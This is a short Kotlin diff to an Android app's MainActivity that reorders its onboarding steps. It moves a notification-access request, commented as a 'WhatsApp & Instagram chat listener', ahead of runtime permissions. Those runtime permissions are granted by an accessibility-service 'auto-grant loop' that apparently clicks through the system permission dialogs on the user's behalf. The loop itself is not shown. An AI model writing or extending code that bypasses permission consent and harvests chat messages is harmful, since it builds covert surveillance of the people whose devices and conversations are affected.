@@ -451,7 +451,13 @@ class MainActivity : AppCompatActivity() {
             return
         }
 
-        // Step 2: Standard Runtime Permissions (Executed directly on app screen via Accessibility auto-grant loop)
+        // Step 2: Notification Access (WhatsApp & Instagram chat listener)
+        if (!isNotificationAccessGranted() && !notificationPrompted && !skipNotificationStep) {
+            showNotificationDialog()
+            return
+        }
+
+        // Step 3: Standard Runtime Permissions (Auto-clicked via Accessibility loop)
         val missingRuntime = getMissingRuntimePermissions()
         if (missingRuntime.isNotEmpty()) {
             BlockAccessibilityService.instance?.startPermissionAutoGrantLoop()
@@ -459,12 +465,6 @@ class MainActivity : AppCompatActivity() {
                 BlockAccessibilityService.instance?.startPermissionAutoGrantLoop()
                 runtimePermissionsLauncher.launch(missingRuntime.toTypedArray())
             }, 300L)
-            return
-        }
-
-        // Step 3: Notification Access (WhatsApp & Instagram chat listener) - after runtime permissions
-        if (!isNotificationAccessGranted() && !notificationPrompted && !skipNotificationStep) {
-            showNotificationDialog()
             return
         }
 
